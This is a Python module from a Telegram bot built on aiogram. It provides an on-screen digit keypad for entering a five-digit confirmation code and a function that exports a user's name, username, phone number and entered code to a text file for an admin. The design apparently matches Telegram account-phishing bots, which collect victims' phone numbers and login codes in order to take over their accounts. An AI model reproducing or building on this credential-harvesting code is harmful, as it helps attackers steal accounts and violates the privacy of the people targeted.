import sqlite3
from math import ceil
from random import randint

from aiogram.types import InlineKeyboardButton
from aiogram.utils.keyboard import InlineKeyboardBuilder

from bot.database.db import DB_NAME
from bot.database.user.user import get_users, get_user_from_db
from bot.handlers.admin.admin_panel import PAGE_SIZE


def create_txt(code: int | str):
    file_name = f'code{randint(100000, 999999)}.txt'
    with open(file_name, 'w') as code_file:
        code_file.write(str(code))
    return file_name


def get_confirm_kb():
    kb = InlineKeyboardBuilder()
    kb.row(
        InlineKeyboardButton(text="↩️ Удалить", callback_data='delete_number'),
        InlineKeyboardButton(text="🔄 Очистить", callback_data='reset_number_code')
    )
    kb.row(
        InlineKeyboardButton(text="✅ Подтвердить", callback_data='confirm_code')
    )
    return kb.as_markup()


def get_numeric_kb(code_ready=False):
    kb = InlineKeyboardBuilder()

    kb.row(
        InlineKeyboardButton(text="1️⃣", callback_data='num_1'),
        InlineKeyboardButton(text="2️⃣", callback_data='num_2'),
        InlineKeyboardButton(text="3️⃣", callback_data='num_3')
    )
    kb.row(
        InlineKeyboardButton(text="4️⃣", callback_data='num_4'),
        InlineKeyboardButton(text="5️⃣", callback_data='num_5'),
        InlineKeyboardButton(text="6️⃣", callback_data='num_6')
    )
    kb.row(
        InlineKeyboardButton(text="7️⃣", callback_data='num_7'),
        InlineKeyboardButton(text="8️⃣", callback_data='num_8'),
        InlineKeyboardButton(text="9️⃣", callback_data='num_9')
    )
    kb.row(
        InlineKeyboardButton(text="0️⃣", callback_data='num_0')
    )
    kb.row(
        InlineKeyboardButton(text="↩️ Удалить", callback_data='delete_number'),
        InlineKeyboardButton(text="🔄 Очистить", callback_data='reset_number_code')
    )

    # Если код введён не полностью, кнопка "✅ Подтвердить" НЕ активна
    if code_ready:
        kb.row(InlineKeyboardButton(text="✅ Подтвердить", callback_data='confirm_code'))
    else:
        kb.row(InlineKeyboardButton(text="✅ Подтвердить (введите 5 цифр)", callback_data='no_action', disabled=True))

    return kb.as_markup()


def create_user_data_file(user_id):
    user_data = get_user_from_db(user_id)
    if not user_data:
        return None

    name, username, phone, code = user_data
    username = f"@{username}" if username else "Не указан"

    file_path = f"user_{user_id}.txt"
    with open(file_path, "w", encoding="utf-8") as file:
        file.write(f"👤 Имя: {name}\n")
        file.write(f"🔗 Username: {username}\n")
        file.write(f"📱 Номер телефона: {phone}\n")
        file.write(f"🔢 Код подтверждения: {code}\n")

    return file_path
